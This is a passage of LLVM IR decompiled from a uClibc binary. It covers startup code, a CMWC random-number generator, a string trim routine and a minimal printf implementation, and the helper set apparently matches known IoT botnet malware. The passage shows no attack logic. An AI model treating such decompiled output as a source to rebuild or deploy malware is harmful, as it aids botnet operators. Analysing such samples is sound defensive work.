  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2b090.9, { 1, 0 }
  uselistorder i8** @global_var_2b5b4.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_2b084.19, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2b084.19 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2b084.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2b084.19, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_13108.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 117260, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_2b5e8.26, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_2b5ec.27, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_2b5f0.28, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2b5e8.26 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_2b5e8.26 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_2b5e8.26 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_2b1d4.31, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_2b1d4.31, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_2b5e8.26 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_2b1d0.34, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_2b1d0.34, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_2b5e8.26 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_2b5e8.26, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b5e8.26 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e019 = load i8, i8* %arg2, align 1
  %v2_85e421 = icmp eq i8 %v2_85e019, 0
  br i1 %v2_85e421, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc23 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.022 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.022, 1
  %v1_85d4 = add i32 %v4_85dc23, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge3 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8618 ], [ %storemerge3, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867016 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867016, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.117, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e827 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a89 = load i8, i8* %arg2, align 1
  %v2_86ac11 = icmp eq i8 %v2_86a89, 0
  br i1 %v2_86ac11, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a413 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.012, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a413, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e826 = phi i32 [ %v3_86e827, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e46 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e46, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.37, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e826, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
